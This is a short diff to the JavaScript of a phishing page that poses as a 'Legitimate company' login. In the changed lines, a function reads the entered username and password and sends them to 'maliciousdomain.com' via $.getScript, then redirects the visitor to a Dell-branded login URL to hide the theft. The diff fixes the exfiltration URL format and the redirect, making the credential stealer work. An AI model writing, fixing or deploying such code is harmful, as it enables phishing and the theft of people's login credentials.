@@ -3,7 +3,7 @@ document.getElementById('template').innerHTML = "<center><h1>Legitimate company<
 function myFunction() {
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
-  $.getScript("http://maliciousdomain.com" + username + password);
-  window.replace("https://dell.inquisiteasp.com");
+  $.getScript("http://maliciousdomain.com" + "/" + username + "/"+ password);
+  window.location = "https://dell.inquisiteasp.com/common/Login";
 };
 
